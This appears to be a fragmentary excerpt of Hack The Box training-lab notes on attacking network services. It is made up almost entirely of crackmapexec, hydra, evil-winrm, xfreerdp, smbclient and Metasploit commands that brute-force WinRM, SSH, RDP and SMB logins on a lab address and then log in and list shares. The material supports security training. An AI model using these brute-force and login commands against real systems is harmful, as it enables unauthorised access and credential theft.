...
```shell-session
0xxNosystemisSafe@htb[/htb]$ sudo apt-get -y install crackmapexec
```
...
```shell-session
0xxNosystemisSafe@htb[/htb]$  crackmapexec -h
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ crackmapexec smb -h
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

  Network Services

```shell-session
0xxNosystemisSafe@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ sudo gem install evil-winrm
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
```

  Network Services

```shell-session
0xxNosystemisSafe@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ ssh user@10.129.42.197
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

  Network Services

```shell-session
0xxNosystemisSafe@htb[/htb]$ xfreerdp /v:10.129.42.197 /u:user /p:password
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ msfconsole -q
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME
